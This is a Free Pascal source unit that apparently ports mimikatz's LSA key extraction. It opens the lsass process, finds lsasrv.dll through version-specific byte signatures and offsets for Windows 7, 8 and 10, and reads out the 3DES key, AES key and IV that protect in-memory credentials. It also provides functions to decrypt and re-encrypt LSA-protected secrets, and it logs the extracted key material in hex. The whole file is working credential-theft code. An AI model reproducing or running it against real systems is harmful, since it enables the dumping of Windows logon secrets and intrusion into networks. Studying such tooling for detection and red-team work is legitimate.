unit uLSA;

{$mode delphi}

interface

uses
  windows,Classes, SysUtils,ucryptoapi,utils,upsapi,umemory;

function decryptLSA(cbmemory:ulong;encrypted:array of byte;var decrypted:tbytes):boolean;
function encryptLSA(cbmemory:ulong;decrypted:array of byte;var encrypted:tbytes):boolean;

function findlsakeys(pid:dword;var DesKey,aeskey,iv:tbytes):boolean;


var
  deskey,aeskey,iv,buffer:tbytes;

implementation

type
  _KIWI_HARD_KEY =record
	cbSecret:ULONG;
	data:array[0..59] of byte // etc...
    end;
 KIWI_HARD_KEY=_KIWI_HARD_KEY;

 _KIWI_BCRYPT_KEY =record
 	size:ULONG;
 	tag:array [0..3] of char;	// 'MSSK'
 	type_:ULONG;
 	unk0:ULONG;
 	unk1:ULONG;
 	bits:ULONG;
 	hardkey:KIWI_HARD_KEY;
        end;
  KIWI_BCRYPT_KEY=_KIWI_BCRYPT_KEY;
  PKIWI_BCRYPT_KEY=^KIWI_BCRYPT_KEY;

     _KIWI_BCRYPT_KEY81 =record
	 size:ulong;
	 tag:array [0..3] of char;	// 'MSSK'
	 type_:ulong;
	 unk0:ulong;
	 unk1:ulong;
	 unk2:ulong;
	 unk3:ulong;
	 unk4:ulong;
	 unk5:pointer;	// before, align in x64
	 unk6:ulong;
	 unk7:ulong;
	 unk8:ulong;
	 unk9:ulong;
         //
	 hardkey:KIWI_HARD_KEY;
        end;
     KIWI_BCRYPT_KEY81=_KIWI_BCRYPT_KEY81 ;
     PKIWI_BCRYPT_KEY81=^KIWI_BCRYPT_KEY81;

     _KIWI_BCRYPT_HANDLE_KEY =record
	size:ulong;
	tag:array [0..3] of char;	// 'UUUR'
	hAlgorithm:pointer;
	key:pointer; // PKIWI_BCRYPT_KEY81; or PKIWI_BCRYPT_KEY; depending on OS...
	unk0:pointer;
        end;
     KIWI_BCRYPT_HANDLE_KEY=_KIWI_BCRYPT_HANDLE_KEY;

 function encryptLSA(cbmemory:ulong;decrypted:array of byte;var encrypted:tbytes):boolean;
     const
       BCRYPT_AES_ALGORITHM                    = 'AES';
       BCRYPT_3DES_ALGORITHM                   = '3DES';
     var
       cbIV,i:ulong;
       status:ntstatus;
       tempiv:tbytes;
     begin
       //fillchar(decrypted,sizeof(decrypted),0); //will nullify the array?
     setlength(encrypted,length(decrypted));
     for i:=0 to length(encrypted)-1 do encrypted[i]:=0;

       if (cbMemory mod 8)<>0 then     //multiple of 8
     	begin
     		//hKey = &kAes.hKey;
     		cbIV := sizeof(iv);
                     log('cbmemory:'+inttostr(cbmemory));
                     log('aes decrypted:'+ByteToHexaString (decrypted));
                     setlength(tempiv,length(iv));
                     copymemory(@tempiv[0],@iv[0],length(tempiv));
                     if bencrypt(BCRYPT_AES_ALGORITHM,decrypted,@encrypted[0],aeskey,tempiv)>0 then result:=true;

             end
     	else
     	begin
     		//hKey = &k3Des.hKey;
     		cbIV := sizeof(iv) div 2;
                     log('cbmemory:'+inttostr(cbmemory));
                     log('des decrypted:'+ByteToHexaString (decrypted));
                     setlength(tempiv,length(iv));
                     copymemory(@tempiv[0],@iv[0],length(tempiv));
                     if bencrypt(BCRYPT_3DES_ALGORITHM,decrypted,@encrypted[0],deskey,tempiv)>0 then result:=true;
             end;

     end;

function decryptLSA(cbmemory:ulong;encrypted:array of byte;var decrypted:tbytes):boolean;
const
  BCRYPT_AES_ALGORITHM                    = 'AES';
  BCRYPT_3DES_ALGORITHM                   = '3DES';
var
  cbIV,i:ulong;
  status:ntstatus;
  tempiv:tbytes;
begin
  //fillchar(decrypted,sizeof(decrypted),0); //will nullify the array?
  for i:=0 to length(decrypted)-1 do decrypted[i]:=0;
  if (cbMemory mod 8)<>0 then     //multiple of 8
	begin
		//hKey = &kAes.hKey;
		cbIV := sizeof(iv);
                log('cbmemory:'+inttostr(cbmemory));
                log('aes encrypted:'+ByteToHexaString (encrypted));
                setlength(tempiv,length(iv));
                copymemory(@tempiv[0],@iv[0],length(tempiv));
                if bdecrypt(BCRYPT_AES_ALGORITHM,encrypted,@decrypted[0],aeskey,tempiv)>0 then result:=true;

        end
	else
	begin
		//hKey = &k3Des.hKey;
		cbIV := sizeof(iv) div 2;
                log('cbmemory:'+inttostr(cbmemory));
                log('des encrypted:'+ByteToHexaString (encrypted));
                setlength(tempiv,length(iv));
                copymemory(@tempiv[0],@iv[0],length(tempiv));
                if bdecrypt(BCRYPT_3DES_ALGORITHM,encrypted,@decrypted[0],deskey,tempiv)>0 then result:=true;
        end;

end;

//dd lsasrv!h3DesKey
//dd lsasrv!hAesKey
//dd lsasrv!InitializationVector

function findlsakeys(pid:dword;var DesKey,aeskey,iv:tbytes):boolean;
const
 //win7
 PTRN_WNO8_LsaInitializeProtectedMemory_KEY:array[0..12] of byte=  ($83, $64, $24, $30, $00, $44, $8b, $4c, $24, $48, $48, $8b, $0d);
 PTRN_WIN8_LsaInitializeProtectedMemory_KEY:array[0..11] of byte=  ($83, $64, $24, $30, $00, $44, $8b, $4d, $d8, $48, $8b, $0d);
 //KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WIN8_LsaInitializeProtectedMemory_KEY),	PTRN_WIN8_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {62, -70, 23}},
 PTRN_WN10_LsaInitializeProtectedMemory_KEY:array[0..15] of byte=  ($83, $64, $24, $30, $00, $48, $8d, $45, $e0, $44, $8b, $4d, $d8, $48, $8d, $15);
 PTRN_WALL_LsaInitializeProtectedMemory_KEY_X86:array[0..4]  of byte=  ($6a, $02, $6a, $10, $68);
var
pattern:array of byte;
 IV_OFFSET:ShortInt=0 ; //signed byte
 DES_OFFSET:ShortInt=0 ; //signed byte
 AES_OFFSET:ShortInt=0 ; //signed byte
 hmod:thandle=0;
 MODINFO:  MODULEINFO;
 keySigOffset:nativeuint;
 hprocess:thandle=0;
 hmods:array[0..1023] of thandle;
 cbneeded,count:dword;
 szModName:array[0..254] of char;
 dummy:string;
 lsasrvMem:nativeuint;
 ivOffset,desOffset,aesOffset,keyPointer:nativeuint;
 iv_:tbyte16;
 h3DesKey, hAesKey:KIWI_BCRYPT_HANDLE_KEY;
 extracted3DesKey, extractedAesKey:KIWI_BCRYPT_KEY;
 extracted3DesKey81, extractedAesKey81:KIWI_BCRYPT_KEY81;
 //extracted3DesKey:pointer;
 i:byte;
begin
  result:=false;
  // OS detection
if lowercase(osarch) ='x86' then
   begin
   setlength(pattern,5);
   CopyMemory(@pattern[0],@PTRN_WALL_LsaInitializeProtectedMemory_KEY_X86[0],5);
   IV_OFFSET:=5 ; DES_OFFSET:=-76 ; AES_OFFSET:=-21 ; //tested on win7
   end;
if lowercase(osarch) ='amd64' then
   begin
   if copy(winver,1,3)='6.1' then //win7
      begin
      setlength(pattern,sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY));
      CopyMemory(@pattern[0],@PTRN_WNO8_LsaInitializeProtectedMemory_KEY[0],sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY));
      IV_OFFSET := 59; DES_OFFSET := -61; AES_OFFSET := 25;
      end;
   if copy(winver,1,3)='6.3' then //win8
      begin
      setlength(pattern,sizeof(PTRN_WIN8_LsaInitializeProtectedMemory_KEY));
      CopyMemory(@pattern[0],@PTRN_WIN8_LsaInitializeProtectedMemory_KEY[0],sizeof(PTRN_WIN8_LsaInitializeProtectedMemory_KEY));
      IV_OFFSET:=62 ; DES_OFFSET:=-70 ; AES_OFFSET:=23 ;  //tested on win8
      end;
   if copy(winver,1,3)='10.' then //win10
      begin
      setlength(pattern,sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY));
      CopyMemory(@pattern[0],@PTRN_WN10_LsaInitializeProtectedMemory_KEY[0],sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY));
      IV_OFFSET:=61 ; DES_OFFSET:=-73 ; AES_OFFSET:=16 ; //tested on 1709
      // IV_OFFSET = 61; DES_OFFSET = -73; AES_OFFSET = 16; //before 1903
      //{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY),	PTRN_WN10_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {61, -73, 16}},
      //{KULL_M_WIN_BUILD_10_1809,	{sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY),	PTRN_WN10_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {67, -89, 16}},
      end;
   end;
if IV_OFFSET=0 then
   begin
   log('no offset defined for this OS',1);
   exit;
   end;
//*************************
hmod:=loadlibrary('lsasrv.dll');
log('hMod:'+inttohex(hmod,sizeof(pointer)),0);
fillchar(MODINFO,sizeof(MODINFO),0);
GetModuleInformation (getcurrentprocess,hmod,MODINFO ,sizeof(MODULEINFO));
//lets search keySigOffset "offline" i.e NOT in lsass.exe
keySigOffset:=SearchMem(getcurrentprocess,MODINFO.lpBaseOfDll ,MODINFO.SizeOfImage,pattern);
log('keySigOffset:'+inttohex(keySigOffset,sizeof(pointer)),0);
hprocess:=openprocess( PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_QUERY_INFORMATION,
                                      false,pid);

lsasrvMem:=0;
EnumProcessModules(hprocess, @hMods, SizeOf(hmodule)*1024, cbNeeded);
for count:=0 to cbneeded div sizeof(thandle) do
    begin
      GetModuleFileNameExA( hProcess, hMods[count], szModName,sizeof(szModName) );
      dummy:=lowercase(strpas(szModName ));
      //writeln(dummy);
      if pos('lsasrv.dll',dummy)>0 then begin lsasrvMem:=hMods[count];break;end;
    end;
if lsasrvMem=0 then exit;
//writeln('sizeof(pointer):'+inttostr(sizeof(pointer)));
//writeln('sizeof(nativeuint):'+inttostr(sizeof(nativeuint)));
// Retrieve offset to InitializationVector address due to "lea reg, [InitializationVector]" instruction
ivOffset:=0;
if ReadMem(hprocess, keySigOffset + IV_OFFSET, @ivOffset, 4)=false then
    begin
    log('ReadMem=false '+inttohex(keySigOffset + IV_OFFSET,sizeof(pointer)));
    exit;
    end;
{$ifdef CPU64}
ivOffset:=keySigOffset + IV_OFFSET+ivOffset+4;
{$endif CPU64}
//will match dd lsasrv!InitializationVector
log('IV_OFFSET:'+inttohex(ivOffset,sizeof(pointer)),0);
ReadMem(hprocess, ivoffset, @iv_, sizeof(iv_));
log('IV:'+ByteToHexaString (IV_),0);
setlength(iv,sizeof(iv_));
CopyMemory(@iv[0],@iv_[0],sizeof(iv_));

//keySigOffset:7FFEEE887696
//target :     7ffeee94d998
//delta : 0C6302 // found : 44 63 0c 00 - 0c6344 - 0c6302=66 +4 = 70
//keySigOffset + DES_OFFSET = 7FFEEE887650 //DES_OFFSET:=-70

//7FFEEE94D9DA

// Retrieve offset to h3DesKey address due to "lea reg, [h3DesKey]" instruction
desOffset:=0;
if ReadMem(hprocess, keySigOffset + DES_OFFSET, @desOffset, 4)=false then
   begin
   log('ReadMem=false '+inttohex(keySigOffset + DES_OFFSET,sizeof(pointer)));
   exit;
   end;
{$ifdef CPU64}
desOffset:=keySigOffset + DES_OFFSET+desOffset+4;
{$endif CPU64}
//will match dd lsasrv!h3DesKey
log('DES_OFFSET:'+inttohex(desOffset,sizeof(pointer)));
// Retrieve pointer to h3DesKey which is actually a pointer to KIWI_BCRYPT_HANDLE_KEY struct
if ReadMem(hprocess, desOffset, @keyPointer, sizeof(keyPointer))=false then writeln('readmem=false');
//writeln('keyPointer:'+inttohex(keyPointer,sizeof(pointer)));
// Read the KIWI_BCRYPT_HANDLE_KEY struct from lsass
if ReadMem(hprocess, keyPointer, @h3DesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY))=false then writeln('readmem=false');
log('TAG:'+strpas(h3DesKey.tag ));
// Read in the 3DES key
log('DES:');
if (winver='6.3.9600') or (copy(winver,1,3)='10.') then
   begin
   //extracted3DesKey:=allocmem(sizeof(KIWI_BCRYPT_KEY81)); //we could for a pointer and then typecast
   //writeln('h3DesKey.key:'+inttohex(nativeuint(h3DesKey.key),sizeof(pointer)));
   if ReadMem(hprocess, nativeuint(h3DesKey.key), @extracted3DesKey81, sizeof(KIWI_BCRYPT_KEY81))=false then writeln('readmem=false');
   log('BCRYPT_KEY81TAG:'+strpas(extracted3DesKey81.tag ));
   //writeln('hardkey cbSecret:'+inttostr(extracted3DesKey81.hardkey.cbSecret   ));
   //for i:=0 to extracted3DesKey81.hardkey.cbSecret -1 do write(inttohex(extracted3DesKey81.hardkey.data[i],2));;
   setlength(DesKey ,extracted3DesKey81.hardkey.cbSecret);
   copymemory(@DesKey [0],@extracted3DesKey81.hardkey.data[0],extracted3DesKey81.hardkey.cbSecret);
   log(ByteToHexaString(deskey));
   end
   else
   begin
   if ReadMem(hprocess, nativeuint(h3DesKey.key), @extracted3DesKey, sizeof(KIWI_BCRYPT_KEY))=false then writeln('readmem=false');
   log('KIWI_BCRYPT_KEY:'+strpas(extracted3DesKey.tag ));
   //for i:=0 to extracted3DesKey.hardkey.cbSecret -1 do write(inttohex(extracted3DesKey.hardkey.data[i],2));;
   setlength(DesKey ,extracted3DesKey.hardkey.cbSecret);
   copymemory(@DesKey [0],@extracted3DesKey.hardkey.data[0],extracted3DesKey.hardkey.cbSecret);
   log(ByteToHexaString(deskey));
   end;

// Retrieve offset to hAesKey address due to "lea reg, [hAesKey]" instruction
aesOffset:=0;
if ReadMem(hprocess, keySigOffset + AES_OFFSET, @aesOffset, 4)=false then
   begin
   log('ReadMem=false '+inttohex(keySigOffset + AES_OFFSET,sizeof(pointer)));
   exit;
   end;
{$ifdef CPU64}
aesOffset:=keySigOffset + AES_OFFSET+aesOffset+4;
{$endif CPU64}
//will match dd lsasrv!hAesKey
log('AES_OFFSET:'+inttohex(aesOffset,sizeof(pointer)));
// Retrieve pointer to h3AesKey which is actually a pointer to KIWI_BCRYPT_HANDLE_KEY struct
ReadMem(hprocess, aesOffset, @keyPointer, sizeof(nativeuint));
// Read the KIWI_BCRYPT_HANDLE_KEY struct from lsass
ReadMem(hprocess, keyPointer, @hAesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY));
// Read in AES key
log('AES:');

if (winver='6.3.9600') or (copy(winver,1,3)='10.') then
   begin
   //extracted3DesKey:=allocmem(sizeof(KIWI_BCRYPT_KEY81)); //we could for a pointer and then typecast
   //writeln('h3DesKey.key:'+inttohex(nativeuint(h3DesKey.key),sizeof(pointer)));
   if ReadMem(hprocess, nativeuint(hAesKey.key), @extractedAesKey81, sizeof(KIWI_BCRYPT_KEY81))=false then writeln('readmem=false');
   log('BCRYPT_KEY81TAG:'+strpas(extracted3DesKey81.tag ));
   //for i:=0 to extractedAesKey81.hardkey.cbSecret -1 do write(inttohex(extractedAesKey81.hardkey.data[i],2));;
   setlength(aesKey ,extractedAesKey81.hardkey.cbSecret);
   copymemory(@aesKey [0],@extractedAesKey81.hardkey.data[0],extractedAesKey81.hardkey.cbSecret);
   log(ByteToHexaString(aesKey));
   end
   else
   begin
   ReadMem(hprocess, nativeuint(hAesKey.key), @extractedAesKey, sizeof(KIWI_BCRYPT_KEY));
   log('BCRYPT_KEYTAG:'+strpas(extractedAesKey.tag ));
   //for i:=0 to extractedAesKey.hardkey.cbSecret -1 do write(inttohex(extractedAesKey.hardkey.data[i],2));;
   setlength(aesKey ,extractedAesKey.hardkey.cbSecret);
   copymemory(@aesKey [0],@extractedAesKey.hardkey.data[0],extractedAesKey.hardkey.cbSecret);
   log(ByteToHexaString(aesKey));
   end;

result:=true;

end;


end.

